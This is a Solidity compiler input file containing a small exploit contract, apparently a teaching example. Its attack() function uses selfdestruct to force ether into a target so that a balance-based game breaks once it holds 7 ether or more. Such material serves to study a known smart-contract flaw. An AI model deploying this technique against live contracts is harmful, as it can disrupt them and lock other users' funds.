{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/SendEthToCurve.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.3;\n\ncontract Curve {\n    function getEthBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract SendEthToCurve {\n    function attack(address recipient) public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(recipient));\n        selfdestruct(addr);\n    }\n}"
    }
  }
}